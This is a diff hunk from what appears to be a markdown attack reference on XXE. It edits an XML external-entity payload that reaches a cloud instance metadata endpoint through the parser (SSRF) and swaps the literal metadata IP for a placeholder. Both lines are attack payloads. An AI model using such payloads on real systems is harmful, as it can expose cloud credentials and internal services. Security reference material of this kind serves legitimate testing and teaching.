@@ -86,7 +86,7 @@ Upload as `.svg` to avatar, image, import features. If the server renders SVG an
 
 XXE can be used to reach internal services (like SSRF via XML parser):
 ```xml
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://[cloud-imds-ip]/latest/meta-data/">]>
 <root><data>&xxe;</data></root>
 ```
 
